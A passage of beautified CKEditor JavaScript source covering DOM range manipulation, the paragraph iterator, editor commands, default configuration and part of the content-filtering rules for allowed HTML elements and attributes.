                    return t.evaluator = function(e) {
                        return e.type == (n == CKEDITOR.SHRINK_ELEMENT ? CKEDITOR.NODE_ELEMENT : CKEDITOR.NODE_TEXT);
                    }, t.guard = function(e, t) {
                        return !!u(e) || !(n == CKEDITOR.SHRINK_ELEMENT && e.type == CKEDITOR.NODE_TEXT || t && e.equals(d) || !1 === i && e.type == CKEDITOR.NODE_ELEMENT && e.isBlockBoundary() || e.type == CKEDITOR.NODE_ELEMENT && e.hasAttribute("contenteditable")) && (!t && e.type == CKEDITOR.NODE_ELEMENT && (d = e),
                        !0);
                    }, l && (o = t[n == CKEDITOR.SHRINK_ELEMENT ? "lastForward" : "next"]()) && this.setStartAt(o, e ? CKEDITOR.POSITION_AFTER_START : CKEDITOR.POSITION_BEFORE_START),
                    c && (t.reset(), (t = t[n == CKEDITOR.SHRINK_ELEMENT ? "lastBackward" : "previous"]()) && this.setEndAt(t, e ? CKEDITOR.POSITION_BEFORE_END : CKEDITOR.POSITION_AFTER_END)),
                    !(!l && !c);
                }
            },
            insertNode: function(e) {
                this.optimizeBookmark(), this.trim(!1, !0);
                var t = this.startContainer, n = t.getChild(this.startOffset);
                n ? e.insertBefore(n) : t.append(e), e.getParent() && e.getParent().equals(this.endContainer) && this.endOffset++,
                this.setStartBefore(e);
            },
            moveToPosition: function(e, t) {
                this.setStartAt(e, t), this.collapse(!0);
            },
            moveToRange: function(e) {
                this.setStart(e.startContainer, e.startOffset), this.setEnd(e.endContainer, e.endOffset);
            },
            selectNodeContents: function(e) {
                this.setStart(e, 0), this.setEnd(e, e.type == CKEDITOR.NODE_TEXT ? e.getLength() : e.getChildCount());
            },
            setStart: function(e, t) {
                e.type == CKEDITOR.NODE_ELEMENT && CKEDITOR.dtd.$empty[e.getName()] && (t = e.getIndex(),
                e = e.getParent()), this._setStartContainer(e), this.startOffset = t, this.endContainer || (this._setEndContainer(e),
                this.endOffset = t), i(this);
            },
            setEnd: function(e, t) {
                e.type == CKEDITOR.NODE_ELEMENT && CKEDITOR.dtd.$empty[e.getName()] && (t = e.getIndex() + 1,
                e = e.getParent()), this._setEndContainer(e), this.endOffset = t, this.startContainer || (this._setStartContainer(e),
                this.startOffset = t), i(this);
            },
            setStartAfter: function(e) {
                this.setStart(e.getParent(), e.getIndex() + 1);
            },
            setStartBefore: function(e) {
                this.setStart(e.getParent(), e.getIndex());
            },
            setEndAfter: function(e) {
                this.setEnd(e.getParent(), e.getIndex() + 1);
            },
            setEndBefore: function(e) {
                this.setEnd(e.getParent(), e.getIndex());
            },
            setStartAt: function(e, t) {
                switch (t) {
                  case CKEDITOR.POSITION_AFTER_START:
                    this.setStart(e, 0);
                    break;

                  case CKEDITOR.POSITION_BEFORE_END:
                    e.type == CKEDITOR.NODE_TEXT ? this.setStart(e, e.getLength()) : this.setStart(e, e.getChildCount());
                    break;

                  case CKEDITOR.POSITION_BEFORE_START:
                    this.setStartBefore(e);
                    break;

                  case CKEDITOR.POSITION_AFTER_END:
                    this.setStartAfter(e);
                }
                i(this);
            },
            setEndAt: function(e, t) {
                switch (t) {
                  case CKEDITOR.POSITION_AFTER_START:
                    this.setEnd(e, 0);
                    break;

                  case CKEDITOR.POSITION_BEFORE_END:
                    e.type == CKEDITOR.NODE_TEXT ? this.setEnd(e, e.getLength()) : this.setEnd(e, e.getChildCount());
                    break;

                  case CKEDITOR.POSITION_BEFORE_START:
                    this.setEndBefore(e);
                    break;

                  case CKEDITOR.POSITION_AFTER_END:
                    this.setEndAfter(e);
                }
                i(this);
            },
            fixBlock: function(e, t) {
                var n = this.createBookmark(), i = this.document.createElement(t);
                return this.collapse(e), this.enlarge(CKEDITOR.ENLARGE_BLOCK_CONTENTS), this.extractContents().appendTo(i),
                i.trim(), i.appendBogus(), this.insertNode(i), this.moveToBookmark(n), i;
            },
            splitBlock: function(e) {
                var t = new CKEDITOR.dom.elementPath(this.startContainer, this.root), n = new CKEDITOR.dom.elementPath(this.endContainer, this.root), i = t.block, o = n.block, a = null;
                return t.blockLimit.equals(n.blockLimit) ? ("br" != e && (i || (i = this.fixBlock(!0, e),
                o = new CKEDITOR.dom.elementPath(this.endContainer, this.root).block), o || (o = this.fixBlock(!1, e))),
                e = i && this.checkStartOfBlock(), t = o && this.checkEndOfBlock(), this.deleteContents(),
                i && i.equals(o) && (t ? (a = new CKEDITOR.dom.elementPath(this.startContainer, this.root),
                this.moveToPosition(o, CKEDITOR.POSITION_AFTER_END), o = null) : e ? (a = new CKEDITOR.dom.elementPath(this.startContainer, this.root),
                this.moveToPosition(i, CKEDITOR.POSITION_BEFORE_START), i = null) : (o = this.splitElement(i),
                i.is("ul", "ol") || i.appendBogus())), {
                    previousBlock: i,
                    nextBlock: o,
                    wasStartOfBlock: e,
                    wasEndOfBlock: t,
                    elementPath: a
                }) : null;
            },
            splitElement: function(e) {
                if (!this.collapsed) return null;
                this.setEndAt(e, CKEDITOR.POSITION_BEFORE_END);
                var t = this.extractContents(), n = e.clone(!1);
                return t.appendTo(n), n.insertAfter(e), this.moveToPosition(e, CKEDITOR.POSITION_AFTER_END),
                n;
            },
            removeEmptyBlocksAtEnd: function() {
                function a(t) {
                    return function(e) {
                        return !(n(e) || i(e) || e.type == CKEDITOR.NODE_ELEMENT && e.isEmptyInlineRemoveable() || t.is("table") && e.is("caption"));
                    };
                }
                var n = CKEDITOR.dom.walker.whitespaces(), i = CKEDITOR.dom.walker.bookmark(!1);
                return function(e) {
                    for (var t, n = this.createBookmark(), i = this[e ? "endPath" : "startPath"](), o = i.block || i.blockLimit; o && !o.equals(i.root) && !o.getFirst(a(o)); ) t = o.getParent(),
                    this[e ? "setEndAt" : "setStartAt"](o, CKEDITOR.POSITION_AFTER_END), o.remove(1),
                    o = t;
                    this.moveToBookmark(n);
                };
            }(),
            startPath: function() {
                return new CKEDITOR.dom.elementPath(this.startContainer, this.root);
            },
            endPath: function() {
                return new CKEDITOR.dom.elementPath(this.endContainer, this.root);
            },
            checkBoundaryOfElement: function(e, t) {
                var n, i, o, a = t == CKEDITOR.START, r = this.clone();
                return r.collapse(a), r[a ? "setStartAt" : "setEndAt"](e, a ? CKEDITOR.POSITION_AFTER_START : CKEDITOR.POSITION_BEFORE_END),
                (r = new CKEDITOR.dom.walker(r)).evaluator = (n = a, i = CKEDITOR.dom.walker.whitespaces(),
                o = CKEDITOR.dom.walker.bookmark(1), function(e) {
                    return !(!o(e) && !i(e)) || !n && s(e) || e.type == CKEDITOR.NODE_ELEMENT && e.is(CKEDITOR.dtd.$removeEmpty);
                }), r[a ? "checkBackward" : "checkForward"]();
            },
            checkStartOfBlock: function() {
                var e = this.startContainer, t = this.startOffset;
                return CKEDITOR.env.ie && t && e.type == CKEDITOR.NODE_TEXT && (e = CKEDITOR.tools.ltrim(e.substring(0, t)),
                r.test(e) && this.trim(0, 1)), this.trim(), e = new CKEDITOR.dom.elementPath(this.startContainer, this.root),
                (t = this.clone()).collapse(!0), t.setStartAt(e.block || e.blockLimit, CKEDITOR.POSITION_AFTER_START),
                (e = new CKEDITOR.dom.walker(t)).evaluator = n(), e.checkBackward();
            },
            checkEndOfBlock: function() {
                var e = this.endContainer, t = this.endOffset;
                return CKEDITOR.env.ie && e.type == CKEDITOR.NODE_TEXT && (e = CKEDITOR.tools.rtrim(e.substring(t)),
                r.test(e) && this.trim(1, 0)), this.trim(), e = new CKEDITOR.dom.elementPath(this.endContainer, this.root),
                (t = this.clone()).collapse(!1), t.setEndAt(e.block || e.blockLimit, CKEDITOR.POSITION_BEFORE_END),
                (e = new CKEDITOR.dom.walker(t)).evaluator = n(), e.checkForward();
            },
            getPreviousNode: function(e, t, n) {
                var i = this.clone();
                return i.collapse(1), i.setStartAt(n || this.root, CKEDITOR.POSITION_AFTER_START),
                (n = new CKEDITOR.dom.walker(i)).evaluator = e, n.guard = t, n.previous();
            },
            getNextNode: function(e, t, n) {
                var i = this.clone();
                return i.collapse(), i.setEndAt(n || this.root, CKEDITOR.POSITION_BEFORE_END), (n = new CKEDITOR.dom.walker(i)).evaluator = e,
                n.guard = t, n.next();
            },
            checkReadOnly: function() {
                function n(e, t) {
                    for (;e; ) {
                        if (e.type == CKEDITOR.NODE_ELEMENT) {
                            if ("false" == e.getAttribute("contentEditable") && !e.data("cke-editable")) return 0;
                            if (e.is("html") || "true" == e.getAttribute("contentEditable") && (e.contains(t) || e.equals(t))) break;
                        }
                        e = e.getParent();
                    }
                    return 1;
                }
                return function() {
                    var e = this.startContainer, t = this.endContainer;
                    return !(n(e, t) && n(t, e));
                };
            }(),
            moveToElementEditablePosition: function(e, t) {
                if (e.type == CKEDITOR.NODE_ELEMENT && !e.isEditable(!1)) return this.moveToPosition(e, t ? CKEDITOR.POSITION_AFTER_END : CKEDITOR.POSITION_BEFORE_START),
                !0;
                for (var n = 0; e; ) {
                    if (e.type == CKEDITOR.NODE_TEXT) {
                        t && this.endContainer && this.checkEndOfBlock() && r.test(e.getText()) ? this.moveToPosition(e, CKEDITOR.POSITION_BEFORE_START) : this.moveToPosition(e, t ? CKEDITOR.POSITION_AFTER_END : CKEDITOR.POSITION_BEFORE_START),
                        n = 1;
                        break;
                    }
                    if (e.type == CKEDITOR.NODE_ELEMENT) if (e.isEditable()) this.moveToPosition(e, t ? CKEDITOR.POSITION_BEFORE_END : CKEDITOR.POSITION_AFTER_START),
                    n = 1; else if (t && e.is("br") && this.endContainer && this.checkEndOfBlock()) this.moveToPosition(e, CKEDITOR.POSITION_BEFORE_START); else if ("false" == e.getAttribute("contenteditable") && e.is(CKEDITOR.dtd.$block)) return this.setStartBefore(e),
                    this.setEndAfter(e), !0;
                    var i = e, o = n, a = void 0;
                    i.type == CKEDITOR.NODE_ELEMENT && i.isEditable(!1) && (a = i[t ? "getLast" : "getFirst"](c)),
                    !o && !a && (a = i[t ? "getPrevious" : "getNext"](c)), e = a;
                }
                return !!n;
            },
            moveToClosestEditablePosition: function(e, t) {
                var n, i = new CKEDITOR.dom.range(this.root), o = 0, a = [ CKEDITOR.POSITION_AFTER_END, CKEDITOR.POSITION_BEFORE_START ];
                return i.moveToPosition(e, a[t ? 0 : 1]), e.is(CKEDITOR.dtd.$block) ? (n = i[t ? "getNextEditableNode" : "getPreviousEditableNode"]()) && (o = 1,
                n.type == CKEDITOR.NODE_ELEMENT && n.is(CKEDITOR.dtd.$block) && "false" == n.getAttribute("contenteditable") ? (i.setStartAt(n, CKEDITOR.POSITION_BEFORE_START),
                i.setEndAt(n, CKEDITOR.POSITION_AFTER_END)) : i.moveToPosition(n, a[t ? 1 : 0])) : o = 1,
                o && this.moveToRange(i), !!o;
            },
            moveToElementEditStart: function(e) {
                return this.moveToElementEditablePosition(e);
            },
            moveToElementEditEnd: function(e) {
                return this.moveToElementEditablePosition(e, !0);
            },
            getEnclosedNode: function() {
                if ((e = this.clone()).optimize(), e.startContainer.type != CKEDITOR.NODE_ELEMENT || e.endContainer.type != CKEDITOR.NODE_ELEMENT) return null;
                var e = new CKEDITOR.dom.walker(e), t = CKEDITOR.dom.walker.bookmark(!1, !0), n = CKEDITOR.dom.walker.whitespaces(!0);
                e.evaluator = function(e) {
                    return n(e) && t(e);
                };
                var i = e.next();
                return e.reset(), i && i.equals(e.previous()) ? i : null;
            },
            getTouchedStartNode: function() {
                var e = this.startContainer;
                return this.collapsed || e.type != CKEDITOR.NODE_ELEMENT ? e : e.getChild(this.startOffset) || e;
            },
            getTouchedEndNode: function() {
                var e = this.endContainer;
                return this.collapsed || e.type != CKEDITOR.NODE_ELEMENT ? e : e.getChild(this.endOffset - 1) || e;
            },
            getNextEditableNode: e(),
            getPreviousEditableNode: e(1),
            scrollIntoView: function() {
                var e, t, n, i = new CKEDITOR.dom.element.createFromHtml("<span>&nbsp;</span>", this.document), o = this.clone();
                o.optimize(), (n = o.startContainer.type == CKEDITOR.NODE_TEXT) ? (t = o.startContainer.getText(),
                e = o.startContainer.split(o.startOffset), i.insertAfter(o.startContainer)) : o.insertNode(i),
                i.scrollIntoView(), n && (o.startContainer.setText(t), e.remove()), i.remove();
            },
            _setStartContainer: function(e) {
                this.startContainer = e;
            },
            _setEndContainer: function(e) {
                this.endContainer = e;
            }
        };
    }(), CKEDITOR.POSITION_AFTER_START = 1, CKEDITOR.POSITION_BEFORE_END = 2, CKEDITOR.POSITION_BEFORE_START = 3,
    CKEDITOR.POSITION_AFTER_END = 4, CKEDITOR.ENLARGE_ELEMENT = 1, CKEDITOR.ENLARGE_BLOCK_CONTENTS = 2,
    CKEDITOR.ENLARGE_LIST_ITEM_CONTENTS = 3, CKEDITOR.ENLARGE_INLINE = 4, CKEDITOR.START = 1,
    CKEDITOR.END = 2, CKEDITOR.SHRINK_ELEMENT = 1, CKEDITOR.SHRINK_TEXT = 2, function() {
        function e(e) {
            arguments.length < 1 || (this.range = e, this.forceBrBreak = 0, this.enlargeBr = 1,
            this.enforceRealBlocks = 0, this._ || (this._ = {}));
        }
        function f(e, t, n, i) {
            e: {
                null == i && (a = [], n.forEach(function(e) {
                    if ("true" == e.getAttribute("contenteditable")) return a.push(e), !1;
                }, CKEDITOR.NODE_ELEMENT, !0), i = a);
                for (var o; o = i.shift(); ) if (o.getDtd().p) {
                    i = {
                        element: o,
                        remaining: i
                    };
                    break e;
                }
                i = null;
            }
            var a;
            return i ? (o = CKEDITOR.filter.instances[i.element.data("cke-filter")]) && !o.check(t) ? f(e, t, n, i.remaining) : ((t = new CKEDITOR.dom.range(i.element)).selectNodeContents(i.element),
            (t = t.createIterator()).enlargeBr = e.enlargeBr, t.enforceRealBlocks = e.enforceRealBlocks,
            t.activeFilter = t.filter = o, e._.nestedEditable = {
                element: i.element,
                container: n,
                remaining: i.remaining,
                iterator: t
            }, 1) : 0;
        }
        function m(e, t, n) {
            return !!t && ((e = e.clone()).collapse(!n), e.checkBoundaryOfElement(t, n ? CKEDITOR.START : CKEDITOR.END));
        }
        var g = /^[\r\n\t ]+$/, E = CKEDITOR.dom.walker.bookmark(!1, !0), t = CKEDITOR.dom.walker.whitespaces(!0), p = function(e) {
            return E(e) && t(e);
        }, T = {
            dd: 1,
            dt: 1,
            li: 1
        };
        e.prototype = {
            getNextParagraph: function(e) {
                var t, n, i, o, a;
                if (e = e || "p", this._.nestedEditable) {
                    if (t = this._.nestedEditable.iterator.getNextParagraph(e)) return this.activeFilter = this._.nestedEditable.iterator.activeFilter,
                    t;
                    if (this.activeFilter = this.filter, f(this, e, this._.nestedEditable.container, this._.nestedEditable.remaining)) return this.activeFilter = this._.nestedEditable.iterator.activeFilter,
                    this._.nestedEditable.iterator.getNextParagraph(e);
                    this._.nestedEditable = null;
                }
                if (!this.range.root.getDtd()[e]) return null;
                if (!this._.started) {
                    var r = this.range.clone();
                    n = r.startPath();
                    var s = r.endPath(), l = !r.collapsed && m(r, n.block), c = !r.collapsed && m(r, s.block, 1);
                    r.shrink(CKEDITOR.SHRINK_ELEMENT, !0), l && r.setStartAt(n.block, CKEDITOR.POSITION_BEFORE_END),
                    c && r.setEndAt(s.block, CKEDITOR.POSITION_AFTER_START), n = r.endContainer.hasAscendant("pre", !0) || r.startContainer.hasAscendant("pre", !0),
                    r.enlarge(this.forceBrBreak && !n || !this.enlargeBr ? CKEDITOR.ENLARGE_LIST_ITEM_CONTENTS : CKEDITOR.ENLARGE_BLOCK_CONTENTS),
                    r.collapsed || (n = new CKEDITOR.dom.walker(r.clone()), s = CKEDITOR.dom.walker.bookmark(!0, !0),
                    n.evaluator = s, this._.nextNode = n.next(), (n = new CKEDITOR.dom.walker(r.clone())).evaluator = s,
                    n = n.previous(), this._.lastNode = n.getNextSourceNode(!0, null, r.root), this._.lastNode && this._.lastNode.type == CKEDITOR.NODE_TEXT && !CKEDITOR.tools.trim(this._.lastNode.getText()) && this._.lastNode.getParent().isBlockBoundary() && ((s = this.range.clone()).moveToPosition(this._.lastNode, CKEDITOR.POSITION_AFTER_END),
                    s.checkEndOfBlock() && (s = new CKEDITOR.dom.elementPath(s.endContainer, s.root),
                    this._.lastNode = (s.block || s.blockLimit).getNextSourceNode(!0))), this._.lastNode && r.root.contains(this._.lastNode) || (this._.lastNode = this._.docEndMarker = r.document.createText(""),
                    this._.lastNode.insertAfter(n)), r = null), this._.started = 1, n = r;
                }
                for (s = this._.nextNode, r = this._.lastNode, this._.nextNode = null; s; ) {
                    l = 0, c = s.hasAscendant("pre");
                    var d = s.type != CKEDITOR.NODE_ELEMENT, u = 0;
                    if (d) s.type == CKEDITOR.NODE_TEXT && g.test(s.getText()) && (d = 0); else {
                        var h = s.getName();
                        if (CKEDITOR.dtd.$block[h] && "false" == s.getAttribute("contenteditable")) {
                            f(this, e, t = s);
                            break;
                        }
                        if (s.isBlockBoundary(this.forceBrBreak && !c && {
                            br: 1
                        })) {
                            if ("br" == h) d = 1; else if (!n && !s.getChildCount() && "hr" != h) {
                                i = (t = s).equals(r);
                                break;
                            }
                            n && (n.setEndAt(s, CKEDITOR.POSITION_BEFORE_START), "br" != h && (this._.nextNode = s)),
                            l = 1;
                        } else {
                            if (s.getFirst()) {
                                n || (n = this.range.clone()).setStartAt(s, CKEDITOR.POSITION_BEFORE_START), s = s.getFirst();
                                continue;
                            }
                            d = 1;
                        }
                    }
                    if (d && !n && (n = this.range.clone()).setStartAt(s, CKEDITOR.POSITION_BEFORE_START),
                    i = (!l || d) && s.equals(r), n && !l) for (;!s.getNext(p) && !i; ) {
                        if ((h = s.getParent()).isBlockBoundary(this.forceBrBreak && !c && {
                            br: 1
                        })) {
                            l = 1, d = 0, i || h.equals(r), n.setEndAt(h, CKEDITOR.POSITION_BEFORE_END);
                            break;
                        }
                        d = 1, i = (s = h).equals(r), u = 1;
                    }
                    if (d && n.setEndAt(s, CKEDITOR.POSITION_AFTER_END), (i = !(s = this._getNextSourceNode(s, u, r))) || l && n) break;
                }
                if (!t) {
                    if (!n) return this._.docEndMarker && this._.docEndMarker.remove(), this._.nextNode = null;
                    s = (t = new CKEDITOR.dom.elementPath(n.startContainer, n.root)).blockLimit, l = {
                        div: 1,
                        th: 1,
                        td: 1
                    }, !(t = t.block) && s && !this.enforceRealBlocks && l[s.getName()] && n.checkStartOfBlock() && n.checkEndOfBlock() && !s.equals(n.root) ? t = s : !t || this.enforceRealBlocks && t.is(T) ? (t = this.range.document.createElement(e),
                    n.extractContents().appendTo(t), t.trim(), n.insertNode(t), o = a = !0) : "li" != t.getName() ? n.checkStartOfBlock() && n.checkEndOfBlock() || (t = t.clone(!1),
                    n.extractContents().appendTo(t), t.trim(), o = !(a = n.splitBlock()).wasStartOfBlock,
                    a = !a.wasEndOfBlock, n.insertNode(t)) : i || (this._.nextNode = t.equals(r) ? null : this._getNextSourceNode(n.getBoundaryNodes().endNode, 1, r));
                }
                return o && (o = t.getPrevious()) && o.type == CKEDITOR.NODE_ELEMENT && ("br" == o.getName() ? o.remove() : o.getLast() && "br" == o.getLast().$.nodeName.toLowerCase() && o.getLast().remove()),
                a && (o = t.getLast()) && o.type == CKEDITOR.NODE_ELEMENT && "br" == o.getName() && (!CKEDITOR.env.needsBrFiller || o.getPrevious(E) || o.getNext(E)) && o.remove(),
                this._.nextNode || (this._.nextNode = i || t.equals(r) || !r ? null : this._getNextSourceNode(t, 1, r)),
                t;
            },
            _getNextSourceNode: function(e, t, n) {
                function i(e) {
                    return !(e.equals(n) || e.equals(o));
                }
                var o = this.range.root;
                for (e = e.getNextSourceNode(t, null, i); !E(e); ) e = e.getNextSourceNode(t, null, i);
                return e;
            }
        }, CKEDITOR.dom.range.prototype.createIterator = function() {
            return new e(this);
        };
    }(), CKEDITOR.command = function(t, n) {
        var i;
        this.uiItems = [], this.exec = function(e) {
            return !(this.state == CKEDITOR.TRISTATE_DISABLED || !this.checkAllowed()) && (this.editorFocus && t.focus(),
            !1 === this.fire("exec") || !1 !== n.exec.call(this, t, e));
        }, this.refresh = function(e, t) {
            return !(this.readOnly || !e.readOnly) || (this.context && !t.isContextFor(this.context) ? (this.disable(),
            !0) : this.checkAllowed(!0) ? (this.startDisabled || this.enable(), this.modes && !this.modes[e.mode] && this.disable(),
            !1 === this.fire("refresh", {
                editor: e,
                path: t
            }) || n.refresh && !1 !== n.refresh.apply(this, arguments)) : (this.disable(), !0));
        }, this.checkAllowed = function(e) {
            return e || "boolean" != typeof i ? i = t.activeFilter.checkFeature(this) : i;
        }, CKEDITOR.tools.extend(this, n, {
            modes: {
                wysiwyg: 1
            },
            editorFocus: 1,
            contextSensitive: !!n.context,
            state: CKEDITOR.TRISTATE_DISABLED
        }), CKEDITOR.event.call(this);
    }, CKEDITOR.command.prototype = {
        enable: function() {
            this.state == CKEDITOR.TRISTATE_DISABLED && this.checkAllowed() && this.setState(this.preserveState && void 0 !== this.previousState ? this.previousState : CKEDITOR.TRISTATE_OFF);
        },
        disable: function() {
            this.setState(CKEDITOR.TRISTATE_DISABLED);
        },
        setState: function(e) {
            return !(this.state == e || e != CKEDITOR.TRISTATE_DISABLED && !this.checkAllowed() || (this.previousState = this.state,
            this.state = e, this.fire("state"), 0));
        },
        toggleState: function() {
            this.state == CKEDITOR.TRISTATE_OFF ? this.setState(CKEDITOR.TRISTATE_ON) : this.state == CKEDITOR.TRISTATE_ON && this.setState(CKEDITOR.TRISTATE_OFF);
        }
    }, CKEDITOR.event.implementOn(CKEDITOR.command.prototype), CKEDITOR.ENTER_P = 1,
    CKEDITOR.ENTER_BR = 2, CKEDITOR.ENTER_DIV = 3, CKEDITOR.config = {
        customConfig: "config.js",
        autoUpdateElement: !0,
        language: "",
        defaultLanguage: "en",
        contentsLangDirection: "",
        enterMode: CKEDITOR.ENTER_P,
        forceEnterMode: !1,
        shiftEnterMode: CKEDITOR.ENTER_BR,
        docType: "<!DOCTYPE html>",
        bodyId: "",
        bodyClass: "",
        fullPage: !1,
        height: 200,
        extraPlugins: "",
        removePlugins: "",
        protectedSource: [],
        tabIndex: 0,
        width: "",
        baseFloatZIndex: 1e4,
        blockedKeystrokes: [ CKEDITOR.CTRL + 66, CKEDITOR.CTRL + 73, CKEDITOR.CTRL + 85 ]
    }, function() {
        function a(e, t, n, i, o) {
            var a, r, s;
            for (a in e = [], t) {
                r = "boolean" == typeof (r = t[a]) ? {} : "function" == typeof r ? {
                    match: r
                } : S(r), "$" != a.charAt(0) && (r.elements = a), n && (r.featureName = n.toLowerCase());
                var l = r;
                l.elements = T(l.elements, /\s+/) || null, l.propertiesOnly = l.propertiesOnly || !0 === l.elements;
                var c = /\s*,\s*/, d = void 0;
                for (d in L) {
                    l[d] = T(l[d], c) || null;
                    var u = l, h = B[d], f = T(l[B[d]], c), m = l[d], g = [], E = !0, p = void 0;
                    for (p in f ? E = !1 : f = {}, m) "!" == p.charAt(0) && (p = p.slice(1), g.push(p),
                    f[p] = !0, E = !1);
                    for (;p = g.pop(); ) m[p] = m["!" + p], delete m["!" + p];
                    u[h] = !E && f || null;
                }
                l.match = l.match || null, i.push(r), e.push(r);
            }
            for (t = o.elements, o = o.generic, n = 0, i = e.length; n < i; ++n) {
                for (c in r = !0 === (a = S(e[n])).classes || !0 === a.styles || !0 === a.attributes,
                l = a, d = h = c = void 0, L) l[c] = v(l[c]);
                for (d in u = !0, B) {
                    for (m in f = [], m = void 0, h = l[c = B[d]]) -1 < m.indexOf("*") ? f.push(RegExp("^" + m.replace(/\*/g, ".*") + "$")) : f.push(m);
                    (h = f).length && (l[c] = h, u = !1);
                }
                if (l.nothingRequired = u, l.noProperties = !(l.attributes || l.classes || l.styles),
                !0 === a.elements || null === a.elements) o[r ? "unshift" : "push"](a); else for (s in l = a.elements,
                delete a.elements, l) t[s] ? t[s][r ? "unshift" : "push"](a) : t[s] = [ a ];
            }
        }
        function C(e, t, n, i) {
            if ((!e.match || e.match(t)) && (i || function(e, t) {
                if (e.nothingRequired) return !0;
                var n, i, o, a;
                if (o = e.requiredClasses) for (a = t.classes, n = 0; n < o.length; ++n) if ("string" == typeof (i = o[n])) {
                    if (-1 == CKEDITOR.tools.indexOf(a, i)) return !1;
                } else if (!CKEDITOR.tools.checkIfAnyArrayItemMatches(a, i)) return !1;
                return c(t.styles, e.requiredStyles) && c(t.attributes, e.requiredAttributes);
            }(e, t)) && (e.propertiesOnly || (n.valid = !0), n.allAttributes || (n.allAttributes = s(e.attributes, t.attributes, n.validAttributes)),
            n.allStyles || (n.allStyles = s(e.styles, t.styles, n.validStyles)), !n.allClasses)) {
                if (e = e.classes, t = t.classes, i = n.validClasses, e) if (!0 === e) e = !0; else {
                    for (var o, a = 0, r = t.length; a < r; ++a) i[o = t[a]] || (i[o] = e(o));
                    e = !1;
                } else e = !1;
                n.allClasses = e;
            }
        }
        function s(e, t, n) {
            if (!e) return !1;
            if (!0 === e) return !0;
            for (var i in t) n[i] || (n[i] = e(i));
            return !1;
        }
        function I(e, t, n) {
            if (!e.match || e.match(t)) {
                if (e.noProperties) return !1;
                if (n.hadInvalidAttribute = r(e.attributes, t.attributes) || n.hadInvalidAttribute,
                n.hadInvalidStyle = r(e.styles, t.styles) || n.hadInvalidStyle, e = e.classes, t = t.classes,
                e) {
                    for (var i = !1, o = !0 === e, a = t.length; a--; ) (o || e(t[a])) && (t.splice(a, 1),
                    i = !0);
                    e = i;
                } else e = !1;
                n.hadInvalidClass = e || n.hadInvalidClass;
            }
        }
        function r(e, t) {
            if (!e) return !1;
            var n, i = !1, o = !0 === e;
            for (n in t) (o || e(n)) && (delete t[n], i = !0);
            return i;
        }
        function l(e, t, n) {
            return !(e.disabled || e.customConfig && !n || !t || (e._.cachedChecks = {}, 0));
        }
        function T(e, t) {
            if (!e) return !1;
            if (!0 === e) return e;
            if ("string" == typeof e) return "*" == (e = w(e)) || CKEDITOR.tools.convertArrayToObject(e.split(t));
            if (CKEDITOR.tools.isArray(e)) return !!e.length && CKEDITOR.tools.convertArrayToObject(e);
            var n, i = {}, o = 0;
            for (n in e) i[n] = e[n], o++;
            return !!o && i;
        }
        function c(e, t) {
            if (!t) return !0;
            for (var n, i = 0; i < t.length; ++i) if ("string" == typeof (n = t[i])) {
                if (!(n in e)) return !1;
            } else if (!CKEDITOR.tools.checkIfAnyObjectPropertyMatches(e, n)) return !1;
            return !0;
        }
        function d(e) {
            if (!e) return {};
            e = e.split(/\s*,\s*/).sort();
            for (var t = {}; e.length; ) t[e.shift()] = x;
            return t;
        }
        function u(e) {
            var t, n, i, o, a = {}, r = 1;
            for (e = w(e); t = e.match(P); ) (n = t[2]) ? (i = h(n, "styles"), o = h(n, "attrs"),
            n = h(n, "classes")) : i = o = n = null, a["$" + r++] = {
                elements: t[1],
                classes: n,
                styles: i,
                attributes: o
            }, e = e.slice(t[0].length);
            return a;
        }
        function h(e, t) {
            var n = e.match(i[t]);
            return n ? w(n[1]) : null;
        }
        function O(e) {
            var t = e.styleBackup = e.attributes.style, n = e.classBackup = e.attributes.class;
            e.styles || (e.styles = CKEDITOR.tools.parseCssText(t || "", 1)), e.classes || (e.classes = n ? n.split(/\s+/) : []);
        }
        function f(e, t, n, i) {
            var o, a = 0;
            if (i.toHtml && (t.name = t.name.replace(F, "$1")), i.doCallbacks && e.elementCallbacks) {
                e: for (var r, s = e.elementCallbacks, l = 0, c = s.length; l < c; ++l) if (r = s[l](t)) {
                    o = r;
                    break e;
                }
                if (o) return o;
            }
            if (i.doTransform && (o = e._.transformations[t.name])) {
                for (O(t), s = 0; s < o.length; ++s) b(e, t, o[s]);
                D(t);
            }
            if (i.doFilter) {
                e: {
                    var d, u;
                    if (s = t.name, e = (l = e._).allowedRules.elements[s], o = l.allowedRules.generic,
                    s = l.disallowedRules.elements[s], l = l.disallowedRules.generic, c = i.skipRequired,
                    r = {
                        valid: !1,
                        validAttributes: {},
                        validClasses: {},
                        validStyles: {},
                        allAttributes: !1,
                        allClasses: !1,
                        allStyles: !1,
                        hadInvalidAttribute: !1,
                        hadInvalidClass: !1,
                        hadInvalidStyle: !1
                    }, e || o) {
                        if (O(t), s) for (d = 0, u = s.length; d < u; ++d) if (!1 === I(s[d], t, r)) {
                            e = null;
                            break e;
                        }
                        if (l) for (d = 0, u = l.length; d < u; ++d) I(l[d], t, r);
                        if (e) for (d = 0, u = e.length; d < u; ++d) C(e[d], t, r, c);
                        if (o) for (d = 0, u = o.length; d < u; ++d) C(o[d], t, r, c);
                        e = r;
                    } else e = null;
                }
                if (!e) return n.push(t), N;
                if (!e.valid) return n.push(t), N;
                u = e.validAttributes;
                var h = e.validStyles;
                o = e.validClasses, s = t.attributes;
                var f, m, g = t.styles, E = (l = t.classes, c = t.classBackup, t.styleBackup), p = [];
                r = [];
                var T = /^data-cke-/;
                if (d = !1, delete s.style, delete s.class, delete t.classBackup, delete t.styleBackup,
                !e.allAttributes) for (f in s) u[f] || T.test(f) && (f == (m = f.replace(/^data-cke-saved-/, "")) || u[m]) || (delete s[f],
                d = !0);
                if (!e.allStyles || e.hadInvalidStyle) {
                    for (f in g) e.allStyles || h[f] ? p.push(f + ":" + g[f]) : d = !0;
                    p.length && (s.style = p.sort().join("; "));
                } else E && (s.style = E);
                if (!e.allClasses || e.hadInvalidClass) {
                    for (f = 0; f < l.length; ++f) (e.allClasses || o[l[f]]) && r.push(l[f]);
                    r.length && (s.class = r.sort().join(" ")), c && r.length < c.split(/\s+/).length && (d = !0);
                } else c && (s.class = c);
                if (d && (a = N), !i.skipFinalValidation && !R(t)) return n.push(t), N;
            }
            return i.toHtml && (t.name = t.name.replace($, "cke:$1")), a;
        }
        function D(e) {
            var t, n = e.attributes;
            delete n.style, delete n.class, (t = CKEDITOR.tools.writeCssText(e.styles, !0)) && (n.style = t),
            e.classes.length && (n.class = e.classes.sort().join(" "));
        }
        function R(e) {
            switch (e.name) {
              case "a":
                if (!e.children.length && !e.attributes.name) return !1;
                break;

              case "img":
